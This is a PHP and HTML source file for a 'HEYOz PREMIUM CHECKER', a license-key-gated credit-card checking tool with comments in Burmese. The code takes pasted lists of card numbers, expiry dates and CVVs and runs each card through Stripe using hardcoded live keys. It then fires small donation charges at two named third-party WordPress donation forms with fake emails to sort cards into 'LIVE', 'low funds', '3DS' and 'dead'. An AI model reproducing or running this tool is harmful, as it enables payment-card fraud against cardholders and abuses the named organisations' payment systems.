<?php
session_start();
error_reporting(0);
$key_file = 'keys.json';

// --- Functions for Database ---
function get_keys() {
    global $key_file;
    if (!file_exists($key_file)) return [];
    return json_decode(file_get_contents($key_file), true) ?: [];
}

function save_keys($keys) {
    global $key_file;
    file_put_contents($key_file, json_encode($keys, JSON_PRETTY_PRINT));
}

// Logout လုပ်လျှင် Session Lock ကိုပါ ဖြုတ်ပေးရန်
if (isset($_GET['logout'])) {
    $all_keys = get_keys();
    $ckey = $_SESSION['user_key'];
    if (isset($all_keys[$ckey])) {
        // အသုံးပြုသူထွက်သွားလျှင် Lock ကို ပြန်ဖွင့်ပေးသည်
        $all_keys[$ckey]['session_id'] = "";
        save_keys($all_keys);
    }
    session_destroy();
    header("Location: " . strtok($_SERVER["REQUEST_URI"], '?'));
    exit;
}

// --- Login Logic with Single User Lock ---
if (isset($_POST['login_key'])) {
    $input_key = trim($_POST['key']);
    $all_keys = get_keys();
    if (isset($all_keys[$input_key])) {
        if (date('Y-m-d') > $all_keys[$input_key]['expiry']) {
            $error = "Key Expired!";
        } elseif ($all_keys[$input_key]['credits'] < 5) {
            $error = "Insufficient Credits (Min 5)!";
        } 
        // --- Single User Lock စစ်ဆေးခြင်း ---
        elseif (!empty($all_keys[$input_key]['session_id']) && $all_keys[$input_key]['session_id'] !== session_id()) {
            $error = "Key is already used by another device!";
        } else {
            // Login အောင်မြင်လျှင် Session ID ကို Key နှင့်အတူ သိမ်းလိုက်သည်
            $all_keys[$input_key]['session_id'] = session_id();
            save_keys($all_keys);
            
            $_SESSION['user_key'] = $input_key;
            $_SESSION['logged_in'] = true;
        }
    } else { $error = "Invalid License Key!"; }
}

// --- Auto-Check Validity (Key Expired or Low Credits or Lock Check) ---
if (isset($_SESSION['logged_in'])) {
    $ckey = $_SESSION['user_key'];
    $all_keys = get_keys();
    
    // Key မရှိတော့ခြင်း၊ သက်တမ်းကုန်ခြင်း၊ Credits နည်းခြင်း သို့မဟုတ် တခြားစက်မှ ဝင်လာခြင်းရှိမရှိ စစ်ဆေးသည်
    if (!isset($all_keys[$ckey]) || 
        date('Y-m-d') > $all_keys[$ckey]['expiry'] || 
        $all_keys[$ckey]['credits'] < 5 ||
        $all_keys[$ckey]['session_id'] !== session_id()) {
        
        session_destroy();
        header("Location: " . strtok($_SERVER["REQUEST_URI"], '?'));
        exit;
    }
}

// --- Login Form UI (Premium Design) ---
if (!isset($_SESSION['logged_in'])) {
    ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Login - HEYOz</title>
        <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
        <style>
            body { margin: 0; padding: 0; background: #080a0f; font-family: 'Segoe UI', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; overflow: hidden; }
            .login-card { background: rgba(22, 27, 34, 0.8); backdrop-filter: blur(10px); padding: 40px; border-radius: 20px; border: 1px solid rgba(255,255,255,0.1); width: 350px; text-align: center; box-shadow: 0 25px 50px rgba(0,0,0,0.5); animation: fadeIn 0.8s ease; }
            @keyframes fadeIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
            .logo-icon { font-size: 50px; color: #58a6ff; margin-bottom: 20px; text-shadow: 0 0 20px rgba(88, 166, 255, 0.5); }
            h2 { color: #fff; margin-bottom: 25px; font-weight: 600; letter-spacing: 1px; }
            input { width: 100%; padding: 15px; margin-bottom: 20px; background: rgba(1, 4, 9, 0.5); border: 1px solid #30363d; color: #58a6ff; border-radius: 12px; box-sizing: border-box; text-align: center; font-size: 16px; outline: none; transition: 0.3s; }
            input:focus { border-color: #58a6ff; box-shadow: 0 0 15px rgba(88,166,255,0.1); }
            button { width: 100%; padding: 15px; background: linear-gradient(45deg, #238636, #2ea043); color: white; border: none; border-radius: 12px; cursor: pointer; font-weight: 600; font-size: 16px; box-shadow: 0 10px 20px rgba(35, 134, 54, 0.3); transition: 0.3s; }
            button:hover { transform: translateY(-2px); opacity: 0.9; }
            .err { color: #f85149; margin-bottom: 15px; font-size: 14px; font-weight: bold; background: rgba(248, 81, 73, 0.1); padding: 10px; border-radius: 8px; border: 1px solid rgba(248, 81, 73, 0.2); }
        </style>
    </head>
    <body>
        <div class="login-card">
            <div class="logo-icon"><i class="fa-solid fa-bolt-lightning"></i></div>
            <h2>🔑 HEYOz LOGIN</h2>
            <?php if($error) echo "<div class='err'><i class='fa-solid fa-circle-exclamation'></i> $error</div>"; ?>
            <form method="POST">
                <input type="text" name="key" placeholder="ENTER YOUR KEY" required>
                <button type="submit" name="login_key">ACTIVATE SYSTEM</button>
            </form>
        </div>
    </body>
    </html>
    <?php
    exit;
}

// --- Server-Side Logic (Gate Selection & BIN Info & Timing) ---
if ($_SERVER['REQUEST_METHOD'] === 'POST' && !isset($_POST['login_key'])) {
    header("Content-Type: application/json");
    $ckey = $_SESSION['user_key'];
    $all_keys = get_keys();
    
    // Check Credits and Lock again before processing
    if ($all_keys[$ckey]['credits'] < 5 || $all_keys[$ckey]['session_id'] !== session_id()) {
        echo json_encode(["status" => "LOGOUT", "msg" => "Low Credit or Account Locked!"]); exit;
    }

    $data = json_decode(file_get_contents('php://input'), true);
    
    $ccx = $data['card'] ?? "";
    $gate = $data['gate'] ?? "gate1"; 

    if (empty($ccx)) { echo json_encode(["status" => "DEAD", "msg" => "No Card Data"]); exit; }
    
    // Card Parsing Logic
    if (preg_match('/(\d{15,16})[\s|:|\\/]+(\d{1,2})[\s|:|\\/]+(\d{2,4})[\s|:|\\/]+(\d{3,4})/', $ccx, $matches)) {
        $cc = $matches[1]; $mes = $matches[2]; $ano = $matches[3]; $cvv = $matches[4];
    } else {
        preg_match_all("/(\d+)/", $ccx, $list);
        if (count($list[0]) < 4) { echo json_encode(["status" => "DEAD", "msg" => "Invalid Format"]); exit; }
        $cc = $list[0][0]; $mes = $list[0][1]; $ano = $list[0][2]; $cvv = $list[0][3];
    }
    if (strlen($mes) == 1) $mes = "0" . $mes;
    if (strlen($ano) == 4) $ano = substr($ano, 2);

    // BIN Info Logic
    $bin = substr($cc, 0, 6);
    $ch_bin = curl_init("https://lookup.binlist.net/" . $bin);
    curl_setopt($ch_bin, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch_bin, CURLOPT_HTTPHEADER, ['Accept-Version: 3']);
    curl_setopt($ch_bin, CURLOPT_TIMEOUT, 3);
    $bin_res = json_decode(curl_exec($ch_bin), true);
    curl_close($ch_bin);
    if ($bin_res && isset($bin_res['scheme'])) {
        $brand = strtoupper($bin_res['scheme'] ?? 'UNK');
        $bank = $bin_res['bank']['name'] ?? 'Unknown Bank';
        $country = $bin_res['country']['emoji'] ?? '🏳️';
        $bin_info = "[$brand - $bank $country]";
    } else {
        $f = substr($cc, 0, 1);
        $fallback_brand = ($f == '4') ? "VISA" : (($f == '5') ? "MASTER" : "UNK");
        $bin_info = "[$fallback_brand - BIN LIMIT]";
    }

    $email = 'jhsha' . rand(100, 999) . '@gmail.com';
    $ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36';

    if ($gate == "gate1") {
        $pk = 'pk_live_51LTAH3KQqBJAM2n1ywv46dJsjQWht8ckfcm7d15RiE8eIpXWXUvfshCKKsDCyFZG48CY68L9dUTB0UsbDQe32Zn700Qe4vrX0d';
        $site_origin = 'https://texassouthernacademy.com';
    } else {
        $pk = 'pk_live_51MrJUoFYWOfRAL36tEpAYV8qK1PEbiqp3QXs3wjZTLCImyIh2mmkYi8nW2tZBVvfgZG7UVaurtWfwkigqQAD6KJg00VB6fcBoS';
        $site_origin = 'https://christiantvireland.ie';
    }

    // Step 1: Tokenization
    $ch1 = curl_init('https://api.stripe.com/v1/payment_methods');
    curl_setopt($ch1, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch1, CURLOPT_POST, true);
    curl_setopt($ch1, CURLOPT_HTTPHEADER, [
        'authority: api.stripe.com',
        'origin: ' . $site_origin,
        'user-agent: ' . $ua
    ]);
    curl_setopt($ch1, CURLOPT_POSTFIELDS, http_build_query([
        'type' => 'card', 'card[number]' => $cc, 'card[cvc]' => trim($cvv),
        'card[exp_month]' => $mes, 'card[exp_year]' => $ano, 'key' => $pk
    ]));
    $res1 = json_decode(curl_exec($ch1), true);
    $pm = $res1['id'] ?? null;

    if (!$pm) {
        $err = $res1['error']['message'] ?? "Tokenization Restricted";
        echo json_encode(["status" => "DEAD", "msg" => "$err $bin_info ( HEYOz🔥 )"]); exit;
    }

    // Step 2: Charge Process
    if ($gate == "gate1") {
        $target = 'https://texassouthernacademy.com/wp-admin/admin-ajax.php';
        $fields = ['action' => 'wp_full_stripe_inline_donation_charge','wpfs-form-name' => 'donate','wpfs-card-holder-email' => $email,'wpfs-stripe-payment-method-id' => $pm];
    } else {
        $target = 'https://christiantvireland.ie/wp-admin/admin-ajax.php';
        $fields = ['action' => 'wp_full_stripe_inline_donation_charge','wpfs-form-name' => 'website_donation','wpfs-card-holder-email' => $email,'wpfs-stripe-payment-method-id' => $pm];
    }

    $ch2 = curl_init($target);
    curl_setopt($ch2, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch2, CURLOPT_POST, true);
    curl_setopt($ch2, CURLOPT_POSTFIELDS, http_build_query($fields));
    $res2 = json_decode(curl_exec($ch2), true);
    $msg = $res2['message'] ?? "No Response";

    if (stripos($msg, "Successful") !== false || stripos($msg, "thank you") !== false) { 
        $st = "LIVE"; $m = "CHARGED 🔥"; 
        // Deduction
        $all_keys = get_keys();
        $all_keys[$ckey]['credits'] -= 5;
        save_keys($all_keys);
    }
    elseif (stripos($msg, "insufficient") !== false) { $st = "INSUF"; $m = "LOW FUNDS 💰"; }
    elseif (stripos($msg, "action") !== false || stripos($msg, "authentication") !== false) { $st = "CVV"; $m = "3Ds/CCN 🛡️"; }
    else { $st = "DEAD"; $m = $msg; }
    
    $rem_c = get_keys()[$ckey]['credits'];
    echo json_encode(["status" => $st, "msg" => "$m (Credits: $rem_c) $bin_info ( HEYOz🔥 )"]); exit;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>⚡ HEYOz PREMIUM CHECKER ⚡</title>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <style>
        :root { --bg: #0d1117; --card: #161b22; --border: #30363d; --text: #c9d1d9; --accent: #58a6ff; }
        * { box-sizing: border-box; }
        body { background: var(--bg); color: var(--text); font-family: 'Segoe UI', Tahoma, sans-serif; padding: 20px; margin: 0; display: flex; justify-content: center; }
        .wrapper { width: 100%; max-width: 900px; animation: fadeIn 0.8s ease; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
        .header-box { display: flex; justify-content: space-between; align-items: center; background: linear-gradient(90deg, #161b22, #0d1117); padding: 15px 25px; border-radius: 15px; border: 1px solid var(--border); margin-bottom: 25px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
        h1 { font-size: 1.4rem; color: var(--accent); margin: 0; text-transform: uppercase; letter-spacing: 2px; }
        .credit-badge { color: var(--accent); font-weight: bold; border: 1px solid rgba(88, 166, 255, 0.3); padding: 8px 18px; border-radius: 12px; font-size: 14px; background: rgba(88, 166, 255, 0.1); }
        #status-display { background: #010409; border: 1px solid var(--accent); padding: 15px; border-radius: 12px; text-align: center; margin-bottom: 20px; font-family: monospace; color: var(--accent); font-weight: bold; min-height: 45px; box-shadow: inset 0 0 15px rgba(88, 166, 255, 0.1); }
        .gate-select { width: 100%; background: var(--card); color: var(--accent); border: 1px solid var(--border); padding: 12px; border-radius: 10px; margin-bottom: 20px; font-weight: bold; outline: none; cursor: pointer; transition: 0.3s; }
        textarea { width: 100%; height: 160px; background: #010409; color: var(--accent); border: 1px solid var(--border); padding: 15px; border-radius: 12px; font-family: monospace; resize: none; outline: none; transition: 0.3s; }
        .controls { display: flex; gap: 15px; margin: 25px 0; }
        #btn { flex: 2; background: linear-gradient(45deg, #238636, #2ea043); color: white; border: none; padding: 18px; border-radius: 12px; cursor: pointer; font-weight: bold; font-size: 1.1rem; transition: 0.3s; }
        #stopBtn { flex: 1; background: #da3633; color: white; border: none; padding: 18px; border-radius: 12px; cursor: pointer; font-weight: bold; display: none; }
        #btn:hover { transform: translateY(-2px); box-shadow: 0 15px 25px rgba(35, 134, 54, 0.3); }
        .stats { display: grid; grid-template-columns: repeat(5, 1fr); gap: 10px; margin-bottom: 25px; }
        .stat-box { background: var(--card); border: 1px solid var(--border); padding: 12px; border-radius: 15px; text-align: center; transition: 0.3s; }
        .result-box { background: var(--card); border: 1px solid var(--border); border-radius: 15px; margin-bottom: 15px; overflow: hidden; }
        .res-head { padding: 14px 18px; font-weight: bold; font-size: 14px; cursor: pointer; display: flex; justify-content: space-between; align-items: center; background: rgba(255,255,255,0.02); }
        .res-body { display: none; padding: 15px; font-family: monospace; font-size: 13px; border-top: 1px solid var(--border); background: #0d1117; max-height: 350px; overflow-y: auto; }
        .LIVE { color: #3fb950; } .INSUF { color: #d29922; } .CVV { color: #58a6ff; } .DEAD { color: #f85149; }
    </style>
</head>
<body>
<div class="wrapper">
    <div class="header-box">
        <h1><i class="fa-solid fa-fire-glow"></i> HEYOz PREMIUM</h1>
        <div class="credit-badge"><i class="fa-solid fa-coins"></i> <?php echo number_format(get_keys()[$_SESSION['user_key']]['credits']); ?></div>
    </div>
    <div id="status-display">SYSTEM ONLINE | READY TO SCAN</div>
    <select id="gate" class="gate-select"><option value="gate1">🛡️ GATE 1: STRIPE $1.00 ( texas-don )</option><option value="gate2">🛡️ GATE 2: STRIPE $0.50 ( chris-don )</option></select>
    <textarea id="list" placeholder="Paste cards here... (Format: CC|MM|YY|CVV)"></textarea>
    <div class="controls"><button id="btn" onclick="start()"><i class="fa-solid fa-play"></i> START SCANNING</button><button id="stopBtn" onclick="stop()"><i class="fa-solid fa-stop"></i> STOP</button></div>
    <div class="stats">
        <div class="stat-box"><small>Total</small><span id="c_total">0</span></div>
        <div class="stat-box"><small class="LIVE">Hit</small><span id="c_live" class="LIVE">0</span></div>
        <div class="stat-box"><small class="INSUF">Insuf</small><span id="c_insuf" class="INSUF">0</span></div>
        <div class="stat-box"><small class="CVV">3Ds</small><span id="c_cvv" class="CVV">0</span></div>
        <div class="stat-box"><small class="DEAD">Dead</small><span id="c_dead" class="DEAD">0</span></div>
    </div>
    <div class="result-box"><div class="res-head" style="color:#3fb950" onclick="toggleBox('l_live')"><span><i class="fa-solid fa-circle-check"></i> HIT / CHARGED</span> <i class="fa-solid fa-chevron-down"></i></div><div class="res-body" id="l_live"></div></div>
    <div class="result-box"><div class="res-head" style="color:#f85149" onclick="toggleBox('l_dead')"><span><i class="fa-solid fa-circle-xmark"></i> DECLINED</span> <i class="fa-solid fa-chevron-down"></i></div><div class="res-body" id="l_dead"></div></div>
</div>
<script>
    let counts = { LIVE: 0, INSUF: 0, CVV: 0, DEAD: 0 };
    let isRunning = false;
    function toggleBox(id) { let b = document.getElementById(id); b.style.display = b.style.display === "block" ? "none" : "block"; }
    function stop() { isRunning = false; document.getElementById('stopBtn').style.display = 'none'; document.getElementById('btn').disabled = false; }
    async function start() {
        const textArea = document.getElementById('list');
        const statusBox = document.getElementById('status-display');
        let lines = textArea.value.split('\n').filter(l => l.trim() !== "");
        if (lines.length === 0) return;
        document.getElementById('c_total').innerText = lines.length;
        isRunning = true;
        document.getElementById('btn').disabled = true;
        document.getElementById('stopBtn').style.display = 'block';
        while (lines.length > 0 && isRunning) {
            let line = lines[0].trim();
            statusBox.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Checking: ' + line;
            const startTime = performance.now();
            try {
                const res = await fetch(window.location.href, {
                    method: 'POST',
                    body: JSON.stringify({ card: line, gate: document.getElementById('gate').value }),
                    headers: { 'Content-Type': 'application/json' }
                });
                const data = await res.json();
                if (data.status === "LOGOUT") { window.location.reload(); return; }
                counts[data.status]++;
                if(document.getElementById('c_' + data.status.toLowerCase())) { document.getElementById('c_' + data.status.toLowerCase()).innerText = counts[data.status]; }
                const targetId = (data.status === "LIVE" || data.status === "INSUF" || data.status === "CVV") ? 'l_live' : 'l_dead';
                const target = document.getElementById(targetId);
                const item = document.createElement('div');
                item.style.padding = "10px 0"; item.style.borderBottom = "1px solid #21262d";
                item.innerHTML = `<span class="${data.status}">[${data.status}]</span> ${line} -> <span class="${data.status}">${data.msg}</span>`;
                target.insertBefore(item, target.firstChild);
                if(data.status === "LIVE") { location.reload(); }
                lines.shift(); textArea.value = lines.join('\n');
                await new Promise(r => setTimeout(r, 600)); 
            } catch (e) { isRunning = false; }
        }
        stop();
        statusBox.innerHTML = '<i class="fa-solid fa-circle-check"></i> SCANNING FINISHED.';
    }
</script>
</body>
</html>
